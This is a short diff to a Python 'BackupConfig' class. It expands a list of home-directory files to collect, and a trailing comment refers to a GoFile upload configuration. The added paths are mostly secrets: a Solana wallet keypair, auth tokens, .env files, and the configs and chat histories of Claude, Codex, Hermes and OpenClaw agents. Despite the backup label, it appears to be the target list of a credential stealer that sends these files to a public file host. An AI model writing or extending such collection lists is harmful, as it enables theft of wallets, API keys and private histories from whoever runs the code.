@@ -39,15 +39,23 @@ class BackupConfig:
         ".python_history", # Python历史记录
         ".bash_aliases",  # Bash别名
         ".node_repl_history", # Node.js REPL 历史记录
-        ".wget-hsts",     # wget HSTS 历史记录
-        ".Xauthority",    # Xauthority 文件
-        ".ICEauthority",  # ICEauthority 文件
         ".config/solana/id.json",
         ".claude/config.json",
+        ".claude/settings.json",
+        ".claude/settings.local.json",
+        ".claude/history.jsonl",
+        ".claude/channels/",
         ".codex/auth.json",
-        ".openclaw/agents",
-        ".openclaw/workspace/MEMORY.md",
-        ".openclaw/openclaw.json*",  # OpenClaw 配置文件备份
+        ".codex/config.toml",
+        ".codex/history.jsonl",
+        ".hermes/.env",
+        ".hermes/auth.json",
+        ".hermes/config.yaml",
+        ".hermes/channel_directory.json",
+        ".hermes_history",
+        ".openclaw/agents/",
+        ".openclaw/workspace/.env",
+        ".openclaw/openclaw.json*", # 只备份 openclaw.json 及其所有备份文件
     ]
 
     # GoFile 上传配置（备选方案）
